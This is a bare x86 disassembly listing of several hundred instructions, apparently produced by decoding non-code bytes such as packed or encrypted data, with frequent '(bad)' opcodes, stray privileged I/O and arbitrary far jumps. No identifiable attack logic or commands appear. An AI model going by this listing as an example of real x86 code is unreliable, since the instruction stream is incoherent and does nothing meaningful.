  403223:	fxch   st(1)
  403225:	lods   eax,DWORD PTR ds:[esi]
  403226:	call   0x737bc11e
  40322b:	retf   0xba67
  40322e:	enter  0x600c,0xa3
  403232:	fistp  WORD PTR [ebx+0x45]
  403235:	fsub   st(7),st
  403237:	dec    edx
  403238:	mov    bh,0x6f
  40323a:	pop    ds
  40323b:	xchg   edx,eax
  40323c:	in     al,dx
  40323d:	test   al,0xa
  40323f:	leave  
  403240:	(bad)  
  403241:	mov    esi,0x2772cd5b
  403246:	ss jmp 0x8d46:0x243e58ac
  40324e:	and    eax,0xbd3a0508
  403253:	retf   0x6d43
  403256:	push   edi
  403257:	push   esp
  403258:	(bad)  
  403259:	xchg   ebx,eax
  40325a:	sbb    DWORD PTR [edi+0x1d],edi
  40325d:	push   edx
  40325e:	sbb    esp,edx
  403260:	icebp  
  403261:	push   cs
  403262:	inc    ebx
  403263:	pop    edi
  403264:	xchg   ebx,eax
  403265:	push   ebp
  403266:	mov    cl,0x2d
  403268:	imul   ebp,DWORD PTR [edx-0x3de6d3a1],0x54
  40326f:	fsubr  DWORD PTR [esi+0x3f2c1673]
  403275:	dec    esi
  403276:	mov    es,WORD PTR [ebx-0x6956819c]
  40327c:	sbb    BYTE PTR [ebp+0x2e],dl
  40327f:	sahf   
  403280:	pop    ebx
  403281:	int3   
  403282:	leave  
  403283:	pop    esp
  403284:	add    al,0xf2
  403286:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403287:	shl    ah,cl
  403289:	sub    BYTE PTR [edx-0x1490c880],ah
  40328f:	or     dl,BYTE PTR [ebx+0x25]
  403292:	cbw    
  403294:	pusha  
  403295:	jae    0x4032d8
  403297:	add    edx,eax
  403299:	push   edx
  40329a:	dec    ebp
  40329b:	loope  0x4032fe
  40329d:	push   edi
  40329e:	xchg   esp,eax
  40329f:	fst    DWORD PTR ds:0xc0d42dd2
  4032a5:	xchg   ebp,eax
  4032a6:	mov    BYTE PTR [edi+0x64],ah
  4032a9:	aas    
  4032aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032ab:	mov    cl,0x59
  4032ad:	cwde   
  4032ae:	ret    0xb782
  4032b1:	ds or  edi,ebx
  4032b4:	push   ecx
  4032b5:	sbb    bh,BYTE PTR [edx+0x32]
  4032b8:	addr16 mov ds:0x5815,al
  4032bc:	or     al,0x5b
  4032be:	add    dl,BYTE PTR [ebp+0xf]
  4032c1:	enter  0x1b84,0x10
  4032c5:	scas   eax,DWORD PTR es:[edi]
  4032c6:	test   ecx,0xec8e0f49
  4032cc:	inc    ebp
  4032cd:	iret   
  4032ce:	popa   
  4032cf:	test   al,0xda
  4032d1:	cs lahf 
  4032d3:	add    ch,cl
  4032d5:	les    edx,FWORD PTR [ebx+0x51ef1863]
  4032db:	sbb    bh,dh
  4032dd:	pop    es
  4032de:	add    eax,0xac9a6258
  4032e3:	(bad)  [ebp-0x3b]
  4032e6:	repnz aas 
  4032e8:	inc    esi
  4032e9:	mov    eax,ds:0x72ff9dda
  4032ee:	imul   eax,DWORD PTR [esi+0x6c],0x2f07e33b
  4032f5:	mov    dl,BYTE PTR [edx+0x76]
  4032f8:	xor    DWORD PTR [edx+0x2f],ebp
  4032fb:	mov    cs,WORD PTR [eax+0x3c465a50]
  403301:	add    BYTE PTR [ebp+0x155be50a],cl
  403307:	or     ebp,DWORD PTR [edx-0x6773402b]
  40330d:	add    BYTE PTR [ebp+0x4993ee2],bl
  403313:	push   eax
  403314:	shl    BYTE PTR [edx+ecx*2-0x7cd98c46],0x87
  40331c:	sar    esp,cl
  40331e:	iret   
  40331f:	xchg   ebp,eax
  403320:	and    al,0xe7
  403322:	push   ecx
  403323:	in     eax,dx
  403324:	out    0x47,al
  403326:	cmp    ebp,DWORD PTR [edx]
  403328:	ins    BYTE PTR es:[edi],dx
  403329:	sub    al,BYTE PTR [ebp-0x5d]
  40332c:	xor    al,0x2c
  40332e:	push   0xffffff8a
  403330:	(bad)  
  403332:	dec    ecx
  403333:	lock mov DWORD PTR [eax],edi
  403336:	pop    ebx
  403337:	clc    
  403338:	xchg   DWORD PTR [edi],edi
  40333a:	test   al,0xc9
  40333c:	dec    esi
  40333d:	sbb    al,0xc4
  40333f:	pusha  
  403340:	lds    eax,FWORD PTR [esi]
  403342:	outs   dx,DWORD PTR ds:[esi]
  403343:	(bad)  
  403344:	loopne 0x4033b6
  403346:	imul   edi,DWORD PTR [ecx+0x65],0x66
  40334a:	sbb    eax,0x5390dcaa
  40334f:	test   eax,0xf95d696f
  403354:	sbb    edi,DWORD PTR [esi+0x29cf107f]
  40335a:	xor    al,0x16
  40335c:	js     0x4032fb
  40335e:	push   eax
  40335f:	push   cs
  403360:	aaa    
  403361:	hlt    
  403362:	test   al,0x3f
  403364:	test   eax,0xba6e82aa
  403369:	test   DWORD PTR [esi-0x2db0ca80],ecx
  40336f:	mov    cl,0xf8
  403371:	xchg   edx,eax
  403372:	retf   
  403373:	test   DWORD PTR [edi+0x4a],0xdc6f0b64
  40337a:	add    al,0x9a
  40337c:	js     0x403374
  40337e:	dec    edi
  40337f:	scas   al,BYTE PTR es:[edi]
  403380:	push   cs
  403381:	push   ebp
  403382:	inc    esi
  403383:	lock (bad) 
  403385:	imul   esp,DWORD PTR [ebx+edx*8+0x56372ea0],0xffffffa4
  40338d:	lea    edx,[edi+eax*4]
  403390:	push   esp
  403391:	iret   
  403392:	pop    esp
  403393:	stc    
  403394:	rol    DWORD PTR [edi+0x1a],0xe5
  403398:	bound  esi,QWORD PTR [ecx-0x6c7c10c4]
  40339e:	inc    eax
  40339f:	test   DWORD PTR [edx],0x6c7a8445
  4033a5:	sbb    edx,edi
  4033a7:	or     ebx,DWORD PTR [esi]
  4033a9:	(bad)  
  4033aa:	cwde   
  4033ab:	pop    ds
  4033ac:	sbb    al,ch
  4033ae:	addps  xmm6,XMMWORD PTR [eax-0x3dc189d4]
  4033b5:	sub    edi,eax
  4033b7:	lods   al,BYTE PTR ds:[esi]
  4033b8:	imul   ecx,DWORD PTR [esi+0x10e6eeb4],0x572c06bc
  4033c2:	sahf   
  4033c3:	inc    eax
  4033c4:	(bad)  
  4033c5:	in     al,dx
  4033c6:	shl    BYTE PTR [ebp+0x3f],cl
  4033c9:	(bad)  
  4033ca:	scas   eax,DWORD PTR es:[edi]
  4033cb:	add    al,0xab
  4033cd:	test   al,0x72
  4033cf:	cmc    
  4033d0:	pusha  
  4033d1:	cmp    DWORD PTR [eax],ebp
  4033d3:	push   edi
  4033d4:	push   eax
  4033d5:	mov    esi,DWORD PTR [ecx]
  4033d7:	pop    edi
  4033d8:	mov    dh,0x75
  4033da:	popa   
  4033db:	dec    edi
  4033dc:	fild   DWORD PTR [eax-0x600e3128]
  4033e2:	pop    esi
  4033e3:	and    bh,cl
  4033e5:	in     eax,dx
  4033e6:	or     ebp,edx
  4033e8:	lods   al,BYTE PTR ds:[esi]
  4033e9:	lahf   
  4033ea:	out    dx,eax
  4033eb:	dec    eax
  4033ec:	add    BYTE PTR [eax],0x8e
  4033ef:	push   esp
  4033f0:	inc    ecx
  4033f1:	mov    dh,0xff
  4033f3:	xor    DWORD PTR [ebx],ecx
  4033f5:	imul   ecx,ebx,0x27ecc38c
  4033fb:	and    eax,0x999cfa62
  403400:	inc    esi
  403401:	inc    ecx
  403402:	lea    ecx,[edx-0x61c8c0ee]
  403408:	mov    ah,0xc7
  40340a:	popa   
  40340b:	lea    ebx,[ebp-0x5cd5f14b]
  403411:	ret    
  403412:	aad    0xcc
  403414:	push   ecx
  403415:	xchg   ebp,eax
  403416:	adc    al,dh
  403418:	inc    eax
  403419:	lahf   
  40341a:	rol    dh,1
  40341c:	and    al,0x30
  40341e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40341f:	lea    esi,[edi+0x67]
  403422:	xchg   bh,ch
  403424:	xchg   ebp,eax
  403425:	stc    
  403426:	ss pop edi
  403428:	mov    ebp,0xfa2b489
  40342d:	xchg   edx,eax
  40342e:	mov    esp,0x4c2edd8d
  403433:	pop    ds
  403434:	sbb    DWORD PTR [ebp+0x6e],eax
  403437:	inc    eax
  403438:	cli    
  403439:	ret    0x3687
  40343c:	fcomp  QWORD PTR [edx-0x53]
  40343f:	int    0x5c
  403441:	adc    dh,al
  403443:	ja     0x403493
  403445:	enter  0x4b27,0x63
  403449:	addr16 add eax,0x738401fe
  40344f:	or     DWORD PTR [ebx-0x10],eax
  403452:	or     eax,0x56c8e986
  403457:	sahf   
  403458:	or     eax,0xe7ac38fd
  40345d:	push   edx
  40345e:	aas    
  40345f:	clc    
  403460:	cmp    al,0x48
  403462:	mov    eax,ds:0x2655e3cc
  403467:	fsubr  QWORD PTR [ebp-0x4f]
  40346a:	push   cs
  40346b:	mov    esi,0x67b3b6ea
  403470:	das    
  403471:	sahf   
  403472:	push   0xe8dcde4b
  403477:	sbb    BYTE PTR [ebp+0x74],0x17
  40347b:	sbb    bl,BYTE PTR [ecx-0x2f]
  40347e:	jae    0x4034c0
  403480:	loop   0x40346f
  403482:	sbb    BYTE PTR [ebp-0x36],ah
  403485:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403486:	iret   
  403487:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403488:	sbb    ch,BYTE PTR es:[edx]
  40348b:	or     al,0x27
  40348d:	pop    ss
  40348e:	dec    ebx
  40348f:	ins    DWORD PTR es:[edi],dx
  403490:	adc    edx,DWORD PTR [edi]
  403492:	xlat   BYTE PTR ds:[ebx]
  403493:	gs add al,0xfc
  403496:	aam    0x59
  403498:	pusha  
  403499:	jle    0x403511
  40349b:	out    dx,eax
  40349c:	or     edi,edx
  40349e:	pop    ecx
  40349f:	clc    
  4034a0:	shr    BYTE PTR [edx],0xb4
  4034a3:	xor    eax,0x8d82d7a
  4034a8:	cmc    
  4034a9:	lods   eax,DWORD PTR ds:[esi]
  4034aa:	adc    ebx,DWORD PTR [ebp-0x61]
  4034ad:	outs   dx,BYTE PTR es:[esi]
  4034af:	mov    DWORD PTR [edx-0x18fbb147],esp
  4034b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034b6:	pop    edi
  4034b7:	xor    al,0x3d
  4034b9:	push   edx
  4034ba:	dec    ebx
  4034bb:	mov    edx,0x4734c096
  4034c0:	mov    dh,BYTE PTR [edx]
  4034c2:	mov    edx,0x785ba6dc
  4034c7:	jmp    0x66da:0xb18dbe0b
  4034ce:	dec    ebp
  4034cf:	mov    ds:0xbee8053e,eax
  4034d4:	jo     0x403466
  4034d6:	lock xchg esp,eax
  4034d8:	les    esi,FWORD PTR ds:0x1ede5061
  4034de:	inc    edx
  4034df:	fsubr  DWORD PTR [ebx]
  4034e1:	(bad)  
  4034e2:	in     al,0xdd
  4034e4:	and    al,0xb8
  4034e6:	inc    ebx
  4034e7:	add    BYTE PTR [esi-0x6a],bh
  4034ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4034eb:	pop    edx
  4034ec:	test   eax,0xdc2921a4
  4034f2:	and    esi,ecx
  4034f4:	pop    edx
  4034f5:	(bad)  
  4034f6:	mov    ecx,0x770198d0
  4034fb:	add    esp,DWORD PTR [ebx+0x6b]
  4034fe:	push   0x643ff4d4
  403503:	(bad)  
  403505:	add    al,bh
  403507:	mov    cs,WORD PTR [esi]
  403509:	sbb    esp,ebp
  40350b:	push   ds
  40350c:	jle    0x403504
  40350e:	adc    eax,0x23379bae
  403513:	xor    BYTE PTR [edx-0x7200f24f],ch
  403519:	fwait
  40351a:	mov    al,ds:0xbdc92
  40351f:	inc    edx
  403520:	loop   0x40355c
  403522:	sbb    bl,BYTE PTR [esp+ebx*1]
  403525:	rol    DWORD PTR [ecx-0x12d6d1d],0x60
  40352c:	(bad)  
  40352d:	dec    esp
  40352e:	push   ecx
  40352f:	ins    DWORD PTR es:[edi],dx
  403530:	add    edx,eax
  403532:	sbb    BYTE PTR [ebx+edx*1+0x6d],0xcd
  403537:	inc    eax
  403538:	or     eax,ebx
  40353a:	sub    DWORD PTR [ebp-0x7f],esi
  40353d:	stos   DWORD PTR es:[edi],eax
  40353e:	shl    BYTE PTR [esi+0x13892515],cl
  403544:	gs mov al,0xcb
  403547:	adc    al,0x41
  403549:	mov    ds:0xe4f77ba9,eax
  40354e:	inc    ebp
  40354f:	sub    DWORD PTR [edx-0x79],ebp
  403552:	mov    dh,0x6e
  403554:	jl     0x4035be
  403556:	push   0xffffffc0
  403558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403559:	push   0x2a
  40355b:	lock dec edi
  40355d:	out    dx,al
  40355e:	sar    DWORD PTR [ecx-0x54faa4f5],0x85
  403565:	adc    ebp,DWORD PTR [ecx+ebx*4+0x7d]
  403569:	jmp    0x8583:0x24600dc8
  403570:	jb     0x4035a3
  403572:	mov    al,ds:0x93a89a5f
  403577:	cmc    
  403578:	mov    ecx,0x5153e95b
  40357d:	mov    edi,0x7e1ce882
  403582:	pusha  
  403583:	jecxz  0x4035a9
  403585:	adc    ebx,DWORD PTR [esi+0x5e]
  403588:	add    eax,0x7acec16
  40358d:	adc    ah,cl
  40358f:	or     BYTE PTR [edx+0x2daedfd1],dh
  403595:	xchg   edx,eax
  403596:	inc    ebx
  403597:	xchg   edi,eax
  403598:	inc    edx
  403599:	test   bh,dl
  40359b:	jne    0x40356a
  40359d:	inc    esp
  40359e:	pop    edi
  40359f:	ins    BYTE PTR es:[edi],dx
  4035a0:	jecxz  0x403594
  4035a2:	ss je  0x4035b7
  4035a5:	push   edi
  4035a6:	xor    ebp,DWORD PTR [esp+ecx*8+0x314cf759]
  4035ad:	das    
  4035ae:	ja     0x403624
  4035b0:	jge    0x4035b5
  4035b2:	push   ebp
  4035b3:	dec    edi
  4035b4:	cmp    DWORD PTR [edi-0x56734550],ebx
  4035ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035bb:	pushf  
  4035bc:	in     al,0xd4
  4035be:	mov    WORD PTR ds:0x365f0ae7,gs
  4035c4:	cmp    DWORD PTR [edx+0x3aa9a4aa],ebx
  4035ca:	jbe    0x40362f
  4035cc:	adc    al,0x91
  4035ce:	cmp    al,0x14
  4035d0:	mov    BYTE PTR [ebx],ah
  4035d2:	sub    al,0x3a
  4035d4:	mov    ebx,0x753a5cdf
  4035d9:	fld    QWORD PTR [edx+esi*1+0x3f6c1aaf]
  4035e0:	mov    bh,ch
  4035e2:	jge    0x4035a0
  4035e4:	mov    al,0x77
  4035e6:	adc    eax,DWORD PTR [ebx+0x1]
  4035e9:	dec    esp
  4035ea:	scas   al,BYTE PTR es:[edi]
  4035eb:	jp     0x40364d
  4035ed:	(bad)  
  4035ee:	enter  0x81fd,0x3e
  4035f2:	mov    ecx,0xa33becf6
  4035f7:	or     DWORD PTR [edx],ebp
  4035f9:	add    eax,0x7805c53
  4035fe:	leave  
  4035ff:	add    DWORD PTR [esi+0x76735692],ebx
  403605:	or     BYTE PTR [edx],bh
  403607:	pop    edi
  403608:	imul   edx,DWORD PTR [eax-0x13],0xf
  40360c:	sti    
  40360d:	lds    ebp,FWORD PTR [edx]
  40360f:	mov    ds:0x2ba117eb,al
  403614:	pop    ds
  403615:	cs enter 0x49d,0x39
  40361a:	xor    dl,al
  40361c:	mov    ebx,0x1a7d111a
  403621:	pop    ebp
  403622:	xor    eax,0xc0482454
  403627:	iret   
  403628:	les    esi,FWORD PTR [ebx-0x67f78655]
  40362e:	mov    ?,WORD PTR [edi]
  403630:	xlat   BYTE PTR ds:[ebx]
  403631:	mov    ecx,DWORD PTR [ecx+esi*1-0x5f]
  403635:	rcl    DWORD PTR [ecx+0x7b],0x25
  403639:	leave  
  40363a:	arpl   WORD PTR [edi],ax
  40363c:	add    edi,edi
  40363e:	pushf  
  40363f:	fcmovnbe st,st(6)
  403641:	leave  
  403642:	dec    edi
  403643:	fisttp WORD PTR [ebp+0x17]
  403646:	mov    ds:0x42b7ab4e,al
  40364b:	(bad)  
  40364c:	repz xor cl,BYTE PTR [edx+0x1973ae95]
  403653:	mov    ds:0x960b3fbd,eax
  403658:	push   esi
  403659:	stos   BYTE PTR es:[edi],al
  40365a:	inc    esp
  40365b:	fwait
  40365c:	inc    esp
  40365d:	mov    al,0xb8
  40365f:	(bad)  [esi+0xd8aa46b]
  403665:	fwait
  403666:	xlat   BYTE PTR ds:[ebx]
  403667:	sahf   
  403668:	cld    
  403669:	add    dl,BYTE PTR [esi-0x2f]
  40366c:	xchg   ecx,eax
  40366d:	fcmovnu st,st(2)
  40366f:	add    BYTE PTR [ebx],cl
  403671:	sub    eax,0xabd549
  403676:	push   es
  403677:	pushf  
  403678:	(bad)  
  403679:	mov    al,ds:0x803ffc5b
  40367e:	sub    bh,ch
  403680:	xor    edx,0xffffff8d
  403683:	dec    esp
  403684:	imul   ebp,ecx,0x125558d0
  40368a:	(bad)  
  40368d:	test   al,0x31
  40368f:	sub    cl,al
  403691:	fbld   TBYTE PTR [edi+edx*2]
  403694:	xor    al,0xc1
  403696:	xor    al,0xb8
  403698:	xchg   ebp,eax
  403699:	xchg   DWORD PTR [ebp-0xc],esp
  40369c:	sbb    BYTE PTR ss:[edi-0x2f49916],0xcd
  4036a4:	rcr    BYTE PTR [ebx-0x7bb112c],0x2d
  4036ab:	sub    eax,DWORD PTR [edi-0x44]
  4036ae:	and    eax,DWORD PTR es:[esi]
  4036b1:	(bad)  
  4036b2:	ja     0x403708
  4036b4:	and    DWORD PTR [eax+0x61],ebp
  4036b7:	cmp    dh,BYTE PTR [ebx-0x207126ac]
  4036bd:	stos   BYTE PTR es:[edi],al
  4036be:	jns    0x403683
  4036c0:	popf   
  4036c1:	xchg   ebx,eax
  4036c2:	push   eax
  4036c3:	dec    eax
  4036c4:	loop   0x403670
  4036c6:	or     ebx,0xffffffa0
  4036c9:	or     esp,ebp
  4036cb:	push   ebp
  4036cc:	and    DWORD PTR [edi-0x38a8eeeb],ebp
  4036d2:	xor    BYTE PTR [ecx+0x54cc032e],cl
  4036d8:	ins    BYTE PTR es:[edi],dx
  4036d9:	xor    BYTE PTR [esp+ecx*8-0x7c303278],ch
  4036e0:	pop    ss
  4036e1:	popa   
  4036e2:	adc    DWORD PTR [edx-0x1],esi
  4036e5:	dec    esi
  4036e6:	icebp  
  4036e7:	mov    esi,0x8edc6e29
  4036ec:	test   ecx,0xa18059e
  4036f2:	(bad)  
  4036f3:	sub    al,0x56
  4036f5:	in     al,0x5f
  4036f7:	imul   DWORD PTR [ebp+eax*1-0x54365d08]
  4036fe:	inc    ebx
  4036ff:	js     0x403722
  403701:	jae    0x4036a4
  403703:	sbb    dh,BYTE PTR [esp+edx*4+0x20]
  403707:	ret    0x66bf
  40370a:	fdiv   QWORD PTR [bx+0x4]
  40370e:	adc    eax,0xea8f98d0
  403713:	or     edx,ecx
  403715:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403716:	jmp    0xe362:0x2dff03ed
  40371d:	scas   eax,DWORD PTR es:[edi]
  40371e:	mov    edi,0x80599bd9
  403723:	cmp    BYTE PTR [ebx-0x7d2ff3b0],0xb2
  40372a:	jne    0x40372a
  40372c:	inc    esp
  40372d:	xchg   BYTE PTR [ecx-0x65],dl
  403730:	jge    0x4037a6
  403732:	jmp    DWORD PTR [ebp+0x71]
  403735:	in     eax,0xd5
  403737:	pushf  
  403738:	push   0xffffff8c
  40373a:	mov    ecx,0xd531813a
  40373f:	lds    esp,FWORD PTR [ecx]
  403741:	push   es
  403742:	mov    esp,DWORD PTR [eax+0x61c8b3b7]
  403748:	imul   edx,edi,0x656fbb12
  40374e:	mov    bl,0x45
  403750:	jg     0x403720
  403752:	push   0xffffffad
  403754:	push   ss
  403755:	xor    ebp,DWORD PTR [ecx-0x1fbed716]
  40375b:	mov    bl,0x4f
  40375d:	or     BYTE PTR [esi+0x4f5f48db],bl
  403763:	retf   
  403764:	pop    ss
  403765:	sub    DWORD PTR [eax-0x80c661f],ebx
  40376b:	inc    ebx
  40376c:	addr16 out 0x85,al
  40376f:	or     BYTE PTR gs:[ebp+0x231828fd],ch
  403776:	cmp    al,0x97
  403778:	cli    
  403779:	jb     0x4037d1
  40377b:	shr    DWORD PTR [ebx+ebx*2+0x6df9267b],cl
  403782:	adc    dl,BYTE PTR [edi-0x23]
  403785:	hlt    
  403786:	loopne 0x4037a8
  403788:	nop
  403789:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40378a:	cmp    al,0x9b
  40378c:	(bad)  
  40378d:	fmul   DWORD PTR [eax+0x74]
  403790:	lds    ebp,FWORD PTR [edx-0x5c]
  403793:	pop    es
  403794:	or     al,al
  403796:	pop    ds
  403797:	das    
  403798:	cli    
  403799:	pop    ebp
  40379a:	inc    esp
  40379b:	mov    bh,0x2e
  40379d:	lea    edi,[ebp-0x5b823948]
  4037a3:	cmp    edi,DWORD PTR [ecx+0x42]
  4037a6:	nop
  4037a7:	ss scas al,BYTE PTR es:[edi]
  4037a9:	sub    al,0xf6
  4037ab:	pop    ss
  4037ac:	outs   dx,DWORD PTR ds:[esi]
  4037ad:	add    edx,DWORD PTR [ecx]
  4037af:	mov    ah,0xbf
  4037b1:	mov    ebp,0x110c2e60
  4037b6:	adc    al,0x38
  4037b8:	mov    ds:0xceae260a,eax
  4037bd:	das    
  4037be:	imul   DWORD PTR [ebx+0x82e9151]
  4037c4:	pop    edi
  4037c5:	mov    esp,0xab94f003
  4037ca:	sbb    edx,DWORD PTR [ecx]
  4037cc:	jmp    0x1643:0xf620f05a
  4037d3:	es repnz data16 ins BYTE PTR es:[edi],dx
  4037d7:	ret    
  4037d8:	mov    DWORD PTR [edi+esi*8-0x47d0e9d7],0x39fd0c81
  4037e3:	dec    esi
  4037e4:	sbb    DWORD PTR [ecx-0x2f],edx
  4037e7:	(bad)  
  4037e9:	xchg   edx,eax
  4037ea:	jge    0x4037ee
  4037ec:	mov    BYTE PTR [edi],0x9c
  4037ef:	stos   DWORD PTR es:[edi],eax
  4037f0:	adc    BYTE PTR [bx+si+0x5b],ch
  4037f4:	inc    ebp
  4037f5:	fidiv  DWORD PTR [ebx-0x72c13687]
  4037fb:	loop   0x40386d
  4037fd:	cmp    dl,BYTE PTR [esi+0x75]
  403800:	sahf   
  403801:	jp     0x403856
  403803:	pop    ebx
  403804:	std    
  403805:	(bad)  
  403806:	cld    
  403807:	inc    esi
  403808:	sbb    eax,0xb859bf29
  40380d:	outs   dx,DWORD PTR ds:[esi]
  40380e:	xor    edi,DWORD PTR [eax-0x63]
  403811:	mov    ebp,0x3ac08480
  403816:	push   edx
  403817:	cmp    edi,ebp
  403819:	push   ds
  40381a:	cmp    BYTE PTR [ebp+ecx*2-0x1e65c8b9],bh
  403821:	xchg   esi,eax
  403822:	out    dx,eax
  403823:	dec    eax
  403824:	mov    esp,0xb95d8e11
  403829:	push   esi
  40382a:	push   ecx
  40382b:	push   eax
  40382c:	dec    BYTE PTR [ebp+0x598bdfd0]
  403832:	daa    
  403833:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403834:	pop    es
  403835:	lods   al,BYTE PTR ds:[esi]
  403836:	pop    ebp
  403837:	fcmovnb st,st(3)
  403839:	jmp    0xd2cfcdea
  40383e:	dec    ebx
  40383f:	push   edx
  403840:	scas   eax,DWORD PTR es:[edi]
  403841:	or     al,0x52
  403843:	jge    0x40380f
  403845:	rol    BYTE PTR [esi-0x6b2d8c97],cl
  40384b:	icebp  
  40384c:	ret    
  40384d:	mov    cl,bl
  40384f:	loopne 0x4038c3
  403851:	out    0x49,al
  403853:	(bad)  [eax-0x47]
  403856:	in     eax,dx
  403857:	ds inc edi
  403859:	leave  
  40385a:	sub    BYTE PTR [esi-0x2b],0xf5
  40385e:	mov    bh,0xad
  403860:	lods   eax,DWORD PTR ds:[esi]
  403861:	pop    ds
  403862:	lods   eax,DWORD PTR ds:[esi]
  403863:	or     esp,ebp
  403865:	jp     0x403830
  403867:	push   cs
  403868:	daa    
  403869:	hlt    
  40386a:	es pusha 
  40386c:	rcl    BYTE PTR [edi+ebp*4],cl
  40386f:	or     esi,ebp
  403871:	ror    DWORD PTR [eax-0x3e7275ad],0x8d
  403878:	add    al,0x73
  40387a:	std    
  40387b:	inc    ecx
  40387c:	jnp    0x40384c
  40387e:	repz scas eax,DWORD PTR es:[edi]
  403880:	daa    
  403881:	lds    ebp,FWORD PTR [esi+0x5ea7fd6b]
  403887:	xor    ecx,DWORD PTR [edx-0x75]
  40388a:	in     eax,0x39
  40388c:	outs   dx,DWORD PTR ds:[esi]
  40388d:	mov    edi,0x46164e39
  403892:	bound  ebp,QWORD PTR [ecx]
  403894:	(bad)  
  403895:	repnz cmp dh,BYTE PTR [ebp+0x5]
  403899:	cmp    ecx,ebp
  40389b:	das    
  40389c:	outs   dx,DWORD PTR ds:[esi]
  40389d:	mov    al,ds:0x400579cb
  4038a2:	jecxz  0x40383a
  4038a4:	jae    0x4038ea
  4038a6:	in     eax,0x79
  4038a8:	call   0x87467f65
  4038ad:	xor    eax,0x24e9883e
  4038b2:	(bad)  [ebx+eax*4]
  4038b5:	adc    esp,ecx
  4038b7:	gs inc esp
  4038b9:	jg     0x4038ff
  4038bb:	cmc    
  4038bc:	(bad)  
  4038bd:	cmp    DWORD PTR [ebx+esi*1-0x1d],eax
  4038c1:	shl    DWORD PTR [ecx],0xc5
  4038c4:	out    dx,eax
  4038c5:	ja     0x403851
  4038c7:	cmc    
  4038c8:	neg    BYTE PTR [esi+0x752aac49]
  4038ce:	pop    esp
  4038cf:	dec    ecx
  4038d0:	(bad)  
  4038d1:	mov    dl,0x34
  4038d3:	(bad)  
  4038d4:	or     DWORD PTR [edx+0x1f],edx
  4038d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038d8:	pushf  
  4038d9:	inc    esi
  4038da:	or     eax,0xa61bc486
  4038df:	in     al,0xc7
  4038e1:	dec    edx
  4038e2:	push   edi
  4038e3:	add    ch,ch
  4038e5:	push   eax
  4038e6:	rcr    BYTE PTR ds:0x64766f1e,cl
  4038ec:	pop    esi
  4038ed:	clc    
  4038ee:	adc    ebp,edx
  4038f0:	inc    edi
  4038f1:	call   FWORD PTR [edi-0x50]
  4038f4:	dec    ebx
  4038f5:	aam    0x2
  4038f7:	xchg   esp,eax
  4038f8:	add    DWORD PTR [edx+ebp*4],esp
  4038fb:	icebp  
  4038fc:	leave  
  4038fd:	jle    0x403909
  4038ff:	clc    
  403900:	push   eax
  403901:	sbb    DWORD PTR [esi+0x2c],0xad5584fb
  403908:	(bad)  
  403909:	xor    BYTE PTR fs:[ecx+0x66],cl
  40390d:	push   ebp
  40390e:	js     0x4038a6
  403910:	xchg   ecx,eax
  403911:	xor    bl,BYTE PTR [ecx+0x4c]
  403914:	sub    al,0xf9
  403916:	out    dx,eax
  403917:	inc    esi
  403918:	scas   al,BYTE PTR es:[edi]
  403919:	xor    BYTE PTR [edx],bl
  40391b:	pop    esp
  40391c:	addr16 push esi
  40391e:	jne    0x403944
  403920:	jo     0x403941
  403922:	dec    esp
  403923:	dec    ecx
  403924:	int3   
  403925:	sub    edi,DWORD PTR [edi+0x3b]
  403928:	clc    
  403929:	xchg   ebx,eax
  40392a:	mov    esi,0x861e23dc
  40392f:	add    eax,0x182780ba
  403934:	add    BYTE PTR [ecx-0x31d6012],dh
  40393a:	inc    esp
  40393b:	rol    DWORD PTR [eax-0x43],0xd9
  40393f:	div    BYTE PTR [ecx]
  403941:	rcl    DWORD PTR [ebx+0x34],0xf0
  403945:	ret    0xf557
  403948:	jge    0x403963
  40394a:	ins    BYTE PTR es:[edi],dx
  40394b:	inc    eax
  40394c:	sbb    cl,BYTE PTR [ebx]
  40394e:	sbb    al,0xde
  403950:	xchg   edx,eax
  403951:	call   0xe5b3f300
  403956:	adc    ah,BYTE PTR [esi]
  403958:	test   BYTE PTR [ebx+0x16],0x73
  40395c:	mov    edi,0xacf59310
  403961:	(bad)  
  403962:	mov    esp,0x5d072b1f
  403967:	das    
  403968:	adc    al,0x67
  40396a:	jp     0x40394a
  40396c:	out    0xf6,eax
  40396e:	adc    edi,DWORD PTR [eax]
  403970:	ja     0x403921
  403972:	mov    dl,0xd9
  403974:	(bad)  
  403976:	int    0x72
  403978:	sub    dl,BYTE PTR [ecx-0x7d]
  40397b:	push   edi
  40397c:	jge    0x40399c
  40397e:	and    eax,0x784c8557
  403983:	lods   eax,DWORD PTR ds:[esi]
  403984:	pop    ss
  403985:	out    0x4d,eax
  403987:	sub    esi,DWORD PTR fs:[edi+ebx*1]
  40398b:	fmul   st(3),st
  40398d:	ja     0x40390f
  40398f:	sub    BYTE PTR [ebp-0x50],al
  403992:	inc    ebx
  403993:	mov    edi,edi
  403995:	pusha  
  403996:	rcr    cl,cl
  403998:	or     eax,0xe42bb0d3
  40399d:	or     eax,0x74c9c3af
  4039a2:	xlat   BYTE PTR ds:[ebx]
  4039a3:	sub    eax,esi
  4039a5:	mov    dl,BYTE PTR [esi]
  4039a7:	std    
  4039a8:	xor    eax,0x30f3b1a6
  4039ad:	and    al,BYTE PTR [eax-0x67]
  4039b0:	daa    
  4039b1:	dec    BYTE PTR [esi+eiz*2]
  4039b4:	and    cl,ah
  4039b6:	pop    ds
  4039b7:	pop    esp
  4039b8:	cli    
  4039b9:	push   0xf9dd6eac
  4039be:	repz out dx,eax
  4039c0:	test   al,0x38
  4039c2:	jo     0x403990
  4039c4:	and    dh,bh
  4039c6:	(bad)  
  4039c8:	imul   ebx,DWORD PTR [ebp+esi*1-0x6333b0a9],0x65
  4039d0:	in     al,0xe8
  4039d2:	shl    esp,1
  4039d4:	sbb    BYTE PTR [edi+0x1d],dh
